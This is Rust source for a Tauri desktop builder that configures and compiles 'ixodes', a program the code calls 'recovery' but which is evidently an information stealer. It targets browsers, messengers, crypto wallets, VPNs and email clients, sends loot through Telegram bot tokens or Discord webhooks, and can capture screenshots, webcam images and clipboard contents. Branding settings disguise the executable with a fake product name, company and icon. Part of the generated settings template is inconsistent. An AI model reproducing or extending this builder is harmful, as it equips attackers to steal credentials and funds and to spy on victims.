use image::GenericImageView;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};
use tauri::path::BaseDirectory;
use tauri::{AppHandle, Manager};

#[derive(Serialize)]
struct SettingsFile {
    name: String,
    path: String,
    is_default: bool,
}

#[derive(Serialize)]
struct BuildResult {
    success: bool,
    output: String,
    exe_path: Option<String>,
    moved_to: Option<String>,
}

#[derive(Debug, Deserialize)]
struct BrandingSettings {
    icon_source: Option<String>,
    icon_preset: Option<String>,
    product_name: Option<String>,
    file_description: Option<String>,
    company_name: Option<String>,
    product_version: Option<String>,
    file_version: Option<String>,
    copyright: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RecoverySettings {
    allowed_categories: Vec<String>,
    artifact_key: Option<String>,
    archive_password: Option<String>,
    telegram_token: Option<String>,
    telegram_chat_id: Option<String>,
    discord_webhook: Option<String>,
    capture_screenshots: Option<bool>,
    capture_webcams: Option<bool>,
    capture_clipboard: Option<bool>,
}

#[derive(Debug, Deserialize)]
struct BuildRequest {
    settings: RecoverySettings,
    branding: Option<BrandingSettings>,
    output_dir: Option<String>,
}

fn ixodes_root() -> Result<PathBuf, String> {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let repo_root = manifest_dir
        .parent()
        .and_then(|parent| parent.parent())
        .ok_or("failed to locate repo root")?;
    Ok(repo_root.join("ixodes"))
}

fn recovery_dir(ixodes_root: &Path) -> PathBuf {
    ixodes_root.join("src").join("recovery")
}

fn settings_path(ixodes_root: &Path) -> PathBuf {
    recovery_dir(ixodes_root).join("settings.rs")
}

fn escape_rust_string(value: &str) -> String {
    value.replace('\\', "\\\\").replace('"', "\\\"")
}

fn render_settings_rs(settings: &RecoverySettings) -> Result<String, String> {
    let valid_categories = [
        "Browsers",
        "Messengers",
        "Gaming",
        "EmailClients",
        "VPNs",
        "Wallets",
        "System",
        "Other",
    ];

    for category in &settings.allowed_categories {
        if !valid_categories.contains(&category.as_str()) {
            return Err(format!("unknown recovery category: {category}"));
        }
    }

    let default_categories = if settings.allowed_categories.is_empty() {
        "None".to_string()
    } else {
        let items = settings
            .allowed_categories
            .iter()
            .map(|category| format!("RecoveryCategory::{category}"))
            .collect::<Vec<_>>()
            .join(", ");
        format!("Some(&[{items}])")
    };

    let default_artifact_key = settings
        .artifact_key
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(escape_rust_string);

    let default_artifact_key = match default_artifact_key {
        Some(value) => format!("Some(\"{value}\")"),
        None => "None".to_string(),
    };

    let default_capture_screenshots = settings.capture_screenshots.unwrap_or(false);
    let default_capture_webcams = settings.capture_webcams.unwrap_or(false);
    let default_capture_clipboard = settings.capture_clipboard.unwrap_or(false);

    Ok(format!(
        r#"use crate::recovery::task::RecoveryCategory;
use base64::{{Engine as _, engine::general_purpose::STANDARD}};
use once_cell::sync::Lazy;
use std::{{collections::HashSet, env, str::FromStr}};
use tracing::{{info, warn}};

static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = {default_categories};
static DEFAULT_ARTIFACT_KEY: Option<&str> = {default_artifact_key};
static DEFAULT_CAPTURE_SCREENSHOTS: bool = {default_capture_screenshots};
static DEFAULT_CAPTURE_WEBCAMS: bool = {default_capture_webcams};
static DEFAULT_CAPTURE_CLIPBOARD: bool = {default_capture_clipboard};

static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);

#[derive(Debug)]
pub struct RecoveryControl {{
    allowed_categories: Option<HashSet<RecoveryCategory>>,
    artifact_key: Option<Vec<u8>>,
    capture_screenshots: bool,
    capture_webcams: bool,
}}

impl RecoveryControl {{
    pub fn global() -> &'static Self {{
        &GLOBAL_RECOVERY_CONTROL
    }}

    pub fn allows_category(&self, category: RecoveryCategory) -> bool {{
        self.allowed_categories
            .as_ref()
            .map(|set| set.contains(&category))
            .unwrap_or(true)
    }}

    pub fn artifact_key(&self) -> Option<&[u8]> {{
        self.artifact_key.as_deref()
    }}

    pub fn capture_screenshots(&self) -> bool {{
        self.capture_screenshots
    }}

    pub fn capture_webcams(&self) -> bool {{
        self.capture_webcams
    }}

    pub fn capture_clipboard(&self) -> bool {{
        self.capture_clipboard
    }}

    fn from_env() -> Self {{
        let allowed_categories = env::var("IXODES_ENABLED_CATEGORIES")
            .ok()
            .and_then(|value| parse_categories(&value))
            .or_else(|| default_categories());

        if let Some(categories) = allowed_categories.as_ref() {{
            info!(
                "restricting recovery to {{}} categories",
                categories
                    .iter()
                    .map(|category| category.to_string())
                    .collect::<Vec<_>>()
                    .join(", ")
            );
        }}

        let artifact_key = env::var("IXODES_ARTIFACT_KEY")
            .ok()
            .and_then(|value| decode_artifact_key(&value))
            .or_else(|| DEFAULT_ARTIFACT_KEY.and_then(decode_artifact_key));

        if artifact_key.is_some() {{
            info!("artifact encryption enabled");
        }}

        let capture_screenshots =
            parse_flag("IXODES_CAPTURE_SCREENSHOTS").unwrap_or(DEFAULT_CAPTURE_SCREENSHOTS);
        let capture_webcams =
            parse_flag("IXODES_CAPTURE_WEBCAM").unwrap_or(DEFAULT_CAPTURE_WEBCAMS);
        let capture_clipboard =
            parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);

        RecoveryControl {{
            allowed_categories,
            artifact_key,
            capture_screenshots,
            capture_webcams,
            capture_clipboard,
        }}
    }}
}}

fn default_categories() -> Option<HashSet<RecoveryCategory>> {{
    DEFAULT_ALLOWED_CATEGORIES.map(|categories| categories.iter().copied().collect())
}}

fn decode_artifact_key(value: &str) -> Option<Vec<u8>> {{
    let trimmed = value.trim();
    if trimmed.is_empty() {{
        return None;
    }}
    match STANDARD.decode(trimmed) {{
        Ok(bytes) => {{
            if bytes.len() != 32 {{
                warn!(
                    "artifact encryption key must be 32 bytes (base64); got {{}} bytes",
                    bytes.len()
                );
                None
            }} else {{
                Some(bytes)
            }}
        }}
        Err(err) => {{
            warn!(
                error = ?err,
                "failed to decode artifact encryption key"
            );
            None
        }}
    }}
}}

fn parse_categories(value: &str) -> Option<HashSet<RecoveryCategory>> {{
    let mut set = HashSet::new();
    for segment in value.split(',') {{
        let trimmed = segment.trim();
        if trimmed.is_empty() {{
            continue;
        }}
        match RecoveryCategory::from_str(trimmed) {{
            Ok(category) => {{
                set.insert(category);
            }}
            Err(err) => {{
                warn!("skipping invalid category filter {{trimmed}}: {{err}}");
            }}
        }}
    }}
    if set.is_empty() {{ None }} else {{ Some(set) }}
}}

fn parse_flag(key: &str) -> Option<bool> {{
    env::var(key).ok().map(|value| {{
        matches!(
            value.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        )
    }})
}}
"#,
        default_categories = default_categories,
        default_artifact_key = default_artifact_key,
        default_capture_screenshots = default_capture_screenshots
    ))
}

#[tauri::command]
fn list_settings_files() -> Result<Vec<SettingsFile>, String> {
    let ixodes_root = ixodes_root()?;
    let recovery_dir = recovery_dir(&ixodes_root);
    let default_settings = settings_path(&ixodes_root);

    let entries =
        fs::read_dir(&recovery_dir).map_err(|err| format!("failed to read recovery dir: {err}"))?;

    let mut files: Vec<SettingsFile> = entries
        .filter_map(|entry| entry.ok())
        .filter_map(|entry| {
            let path = entry.path();
            if !path.is_file() {
                return None;
            }
            let file_name = path.file_name()?.to_string_lossy().to_string();
            if !file_name.ends_with(".rs") || !file_name.contains("settings") {
                return None;
            }
            let is_default = path == default_settings;
            Some(SettingsFile {
                name: file_name,
                path: path.to_string_lossy().to_string(),
                is_default,
            })
        })
        .collect();

    files.sort_by(|a, b| a.name.cmp(&b.name));
    if files.is_empty() {
        return Err("no settings files found in ixodes/src/recovery".into());
    }

    Ok(files)
}

#[tauri::command]
async fn build_ixodes(app: AppHandle, request: BuildRequest) -> Result<BuildResult, String> {
    tauri::async_runtime::spawn_blocking(move || build_ixodes_sync(app, request))
        .await
        .map_err(|err| format!("build task failed to join: {err}"))?
}

fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResult, String> {
    let ixodes_root = ixodes_root()?;
    let recovery_dir = recovery_dir(&ixodes_root);
    let default_settings = settings_path(&ixodes_root);
    let backup_path = recovery_dir.join("settings.rs.bak");
    if !backup_path.exists() && default_settings.exists() {
        fs::copy(&default_settings, &backup_path)
            .map_err(|err| format!("failed to back up settings.rs: {err}"))?;
    }

    let settings_rs = render_settings_rs(&request.settings)?;
    fs::write(&default_settings, settings_rs)
        .map_err(|err| format!("failed to write settings.rs: {err}"))?;

    let mut command = Command::new("cargo");
    command
        .arg("build")
        .arg("--release")
        .current_dir(&ixodes_root)
        .env(
            "IXODES_PASSWORD",
            request.settings.archive_password.as_deref().unwrap_or(""),
        );

    if let Some(token) = &request.settings.telegram_token {
        if !token.is_empty() {
            command.env("IXODES_TELEGRAM_TOKEN", token);
        }
    }
    if let Some(chat_id) = &request.settings.telegram_chat_id {
        if !chat_id.is_empty() {
            command.env("IXODES_CHAT_ID", chat_id);
        }
    }
    if let Some(webhook) = &request.settings.discord_webhook {
        if !webhook.is_empty() {
            command.env("IXODES_DISCORD_WEBHOOK", webhook);
        }
    }

    if let Some(branding) = request.branding.as_ref() {
        apply_branding_env(&app, &mut command, branding)?;
    }

    let output = command
        .output()
        .map_err(|err| format!("failed to start cargo build: {err}"))?;

    let mut combined = String::new();
    combined.push_str(&String::from_utf8_lossy(&output.stdout));
    if !output.stderr.is_empty() {
        if !combined.ends_with('\n') {
            combined.push('\n');
        }
        combined.push_str(&String::from_utf8_lossy(&output.stderr));
    }

    if !output.status.success() {
        return Ok(BuildResult {
            success: false,
            output: combined.trim().to_string(),
            exe_path: None,
            moved_to: None,
        });
    }

    let exe_name = if cfg!(windows) {
        "ixodes.exe"
    } else {
        "ixodes"
    };
    let exe_path = ixodes_root.join("target").join("release").join(exe_name);
    if !exe_path.exists() {
        return Ok(BuildResult {
            success: false,
            output: format!(
                "{}\nexpected executable not found: {}",
                combined.trim(),
                exe_path.display()
            ),
            exe_path: None,
            moved_to: None,
        });
    }

    let moved_to = if let Some(output_dir) = request.output_dir.as_deref().map(str::trim) {
        if output_dir.is_empty() {
            None
        } else {
            let output_path = PathBuf::from(output_dir);
            if output_path.extension().is_some() {
                Some(output_path)
            } else {
                fs::create_dir_all(&output_path)
                    .map_err(|err| format!("failed to create output directory: {err}"))?;
                Some(output_path.join(exe_name))
            }
        }
    } else {
        None
    };

    let moved_to = moved_to.unwrap_or_else(|| {
        std::env::var("USERPROFILE")
            .map(PathBuf::from)
            .or_else(|_| std::env::var("HOME").map(PathBuf::from))
            .map(|home| home.join("Desktop").join(exe_name))
            .unwrap_or_else(|_| PathBuf::from(exe_name))
    });

    if moved_to.exists() {
        fs::remove_file(&moved_to)
            .map_err(|err| format!("failed to remove existing output binary: {err}"))?;
    }

    if let Err(err) = fs::rename(&exe_path, &moved_to) {
        fs::copy(&exe_path, &moved_to)
            .map_err(|copy_err| format!("failed to copy exe to desktop: {copy_err}"))?;
        fs::remove_file(&exe_path)
            .map_err(|remove_err| format!("failed to remove original exe: {remove_err}"))?;
        combined = format!(
            "{}\nmove fallback used (rename failed: {err})",
            combined.trim()
        );
    }

    Ok(BuildResult {
        success: true,
        output: combined.trim().to_string(),
        exe_path: Some(exe_path.to_string_lossy().to_string()),
        moved_to: Some(moved_to.to_string_lossy().to_string()),
    })
}

fn apply_branding_env(
    app: &AppHandle,
    command: &mut Command,
    branding: &BrandingSettings,
) -> Result<(), String> {
    let icon_path = resolve_icon_path(app, branding)?;
    if let Some(icon) = icon_path {
        command.env("IXODES_ICON_PATH", icon.to_string_lossy().to_string());
    }

    set_env_if_present(
        command,
        "IXODES_PRODUCT_NAME",
        branding.product_name.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_FILE_DESCRIPTION",
        branding.file_description.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_COMPANY_NAME",
        branding.company_name.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_PRODUCT_VERSION",
        branding.product_version.as_deref(),
    );
    set_env_if_present(
        command,
        "IXODES_FILE_VERSION",
        branding.file_version.as_deref(),
    );
    set_env_if_present(command, "IXODES_COPYRIGHT", branding.copyright.as_deref());

    Ok(())
}

fn set_env_if_present(command: &mut Command, key: &str, value: Option<&str>) {
    if let Some(value) = value.map(str::trim).filter(|value| !value.is_empty()) {
        command.env(key, value);
    }
}

fn resolve_icon_path(
    app: &AppHandle,
    branding: &BrandingSettings,
) -> Result<Option<PathBuf>, String> {
    if let Some(source) = branding
        .icon_source
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        if source.starts_with("http://") || source.starts_with("https://") {
            let bytes = download_icon(source)?;
            let normalized = normalize_icon_from_bytes(&bytes, target_icon_ext())?;
            return Ok(Some(normalized));
        }

        let path = PathBuf::from(source);
        if path.is_dir() {
            if let Some(candidate) = select_icon_from_dir(&path) {
                let normalized = normalize_icon_from_path(&candidate, target_icon_ext())?;
                return Ok(Some(normalized));
            }
            return Ok(None);
        }
        if path.is_file() {
            let normalized = normalize_icon_from_path(&path, target_icon_ext())?;
            return Ok(Some(normalized));
        }
        return Err(format!("icon path not found: {source}"));
    }

    if let Some(preset) = branding
        .icon_preset
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        if preset == "none" {
            return Ok(None);
        }

        if preset == "tauri-default" {
            let base = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
            let icon_path = if cfg!(windows) {
                base.join("icons").join("icon.ico")
            } else if cfg!(target_os = "macos") {
                base.join("icons").join("icon.icns")
            } else {
                base.join("icons").join("icon.png")
            };
            if icon_path.exists() {
                let normalized = normalize_icon_from_path(&icon_path, target_icon_ext())?;
                return Ok(Some(normalized));
            }
            return Err("tauri default icon not found".into());
        }

        let preset_path = resolve_preset_icon(app, preset)?;
        let normalized = normalize_icon_from_path(&preset_path, target_icon_ext())?;
        return Ok(Some(normalized));
    }

    Ok(None)
}

fn select_icon_from_dir(dir: &Path) -> Option<PathBuf> {
    let candidates = if cfg!(windows) {
        ["icon.ico", "app.ico", "ixodes.ico"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    } else if cfg!(target_os = "macos") {
        ["icon.icns", "app.icns", "ixodes.icns"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    } else {
        ["icon.png", "app.png", "ixodes.png"]
            .iter()
            .map(|name| dir.join(name))
            .collect::<Vec<_>>()
    };

    for candidate in candidates {
        if candidate.exists() {
            return Some(candidate);
        }
    }
    None
}

fn download_icon(url: &str) -> Result<Vec<u8>, String> {
    let response =
        reqwest::blocking::get(url).map_err(|err| format!("failed to download icon: {err}"))?;
    if !response.status().is_success() {
        return Err(format!("icon download failed ({})", response.status()));
    }
    let content_type = response
        .headers()
        .get(reqwest::header::CONTENT_TYPE)
        .and_then(|value| value.to_str().ok())
        .map(|value| value.to_string());
    let bytes = response
        .bytes()
        .map_err(|err| format!("failed to read icon response: {err}"))?;

    let _ = icon_extension_from_url(url).or_else(|| {
        content_type
            .as_deref()
            .and_then(icon_extension_from_content_type)
    });

    Ok(bytes.to_vec())
}

fn resolve_preset_icon(app: &AppHandle, preset: &str) -> Result<PathBuf, String> {
    let exts: &[&str] = if cfg!(windows) {
        &["ico", "png"]
    } else {
        &["png"]
    };

    for ext in exts {
        let rel = Path::new("presets").join(format!("{preset}.{ext}"));
        if let Ok(path) = app.path().resolve(&rel, BaseDirectory::Resource) {
            if path.exists() {
                return Ok(path);
            }
        }

        let dev_path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(&rel);
        if dev_path.exists() {
            return Ok(dev_path);
        }
    }

    Err(format!(
        "preset icon not found: presets/{}.(ico|png)",
        preset
    ))
}

fn icon_extension_from_url(url: &str) -> Option<String> {
    let trimmed = url.split('?').next().unwrap_or(url);
    let ext = Path::new(trimmed)
        .extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| ext.to_ascii_lowercase())?;
    if ext == "ico" || ext == "icns" || ext == "png" {
        Some(ext)
    } else {
        None
    }
}

fn icon_extension_from_content_type(content_type: &str) -> Option<String> {
    let content_type = content_type.to_ascii_lowercase();
    if content_type.contains("image/x-icon") || content_type.contains("image/vnd.microsoft.icon") {
        Some("ico".to_string())
    } else if content_type.contains("image/icns") {
        Some("icns".to_string())
    } else if content_type.contains("image/png") {
        Some("png".to_string())
    } else {
        None
    }
}

fn target_icon_ext() -> &'static str {
    if cfg!(windows) {
        "ico"
    } else {
        "png"
    }
}

fn normalize_icon_from_path(path: &Path, target_ext: &str) -> Result<PathBuf, String> {
    if let Some(ext) = path.extension().and_then(|ext| ext.to_str()) {
        if ext.eq_ignore_ascii_case("icns") {
            return Err("icns files are not supported yet; provide a 256-512px PNG instead".into());
        }
    }
    let bytes = fs::read(path).map_err(|err| format!("failed to read icon: {err}"))?;
    normalize_icon_from_bytes(&bytes, target_ext)
}

fn normalize_icon_from_bytes(bytes: &[u8], target_ext: &str) -> Result<PathBuf, String> {
    let image = image::load_from_memory(bytes)
        .map_err(|err| format!("failed to decode icon image: {err}"))?;
    let (width, height) = image.dimensions();

    if width != height {
        return Err("icon must be square (same width and height)".into());
    }
    if width < 256 || width > 512 {
        return Err("icon must be between 256x256 and 512x512".into());
    }

    let resized = if width == 256 {
        image
    } else {
        image.resize_exact(256, 256, image::imageops::FilterType::Lanczos3)
    };
    let rgba = resized.to_rgba8();

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_millis())
        .unwrap_or(0);
    let file_name = format!("ixodes-icon-{timestamp}.{target_ext}");
    let path = std::env::temp_dir().join(file_name);

    if target_ext == "ico" {
        let icon = ico::IconImage::from_rgba_data(256, 256, rgba.into_raw());
        let mut dir = ico::IconDir::new(ico::ResourceType::Icon);
        dir.add_entry(ico::IconDirEntry::encode(&icon).map_err(|err| err.to_string())?);
        let mut file =
            fs::File::create(&path).map_err(|err| format!("failed to write icon: {err}"))?;
        dir.write(&mut file)
            .map_err(|err| format!("failed to write ico: {err}"))?;
    } else {
        rgba.save(&path)
            .map_err(|err| format!("failed to write icon: {err}"))?;
    }

    Ok(path)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .invoke_handler(tauri::generate_handler![list_settings_files, build_ixodes])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
